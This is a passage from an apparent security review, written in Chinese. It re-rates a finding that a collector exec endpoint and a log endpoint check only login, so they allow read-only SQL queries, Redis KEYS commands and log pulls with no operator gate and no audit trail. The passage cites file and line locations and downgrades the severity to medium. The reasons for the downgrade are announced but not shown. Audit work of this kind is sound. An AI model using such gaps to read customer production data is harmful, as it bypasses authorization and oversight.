- **/systems/{id}/collector/exec 只校验登录，只读账号即可在客户生产库执行任意 SELECT、KEYS *、拉日志，且无审计** → overstated（修正严重度：medium）
  事实层面核查通过：`backend/app/api/collector_exec.py:33` 只有 `get_current_org_id`（无 `require_operator`），同目录 `backend/app/api/collectors.py:23/43/56` 的创建/删除/下载都要求 operator，restart 还要审批；`backend/app/services/collectors/exec.py:14-17` 确实放行 `run_readonly_query` / `run_redis_command`（含 KEYS）/ `fetch_logs`；`backend/app/api/health.py:109` 的日志接口同样只有登录校验；这些 REST 处理器内部确实一次 `record_audit_event` 都没调。但定级所依赖的两条叙事有硬伤：

  真正成立的是：直连 REST 的数据读取/日志拉取既没有与写动作对齐的授权门，也没有留痕，且与同项目"写动作要审批"的取向不一致。属真实缺陷，但"只读账号即可 + 完全无审计"的 high 依据不成立，降为 medium。
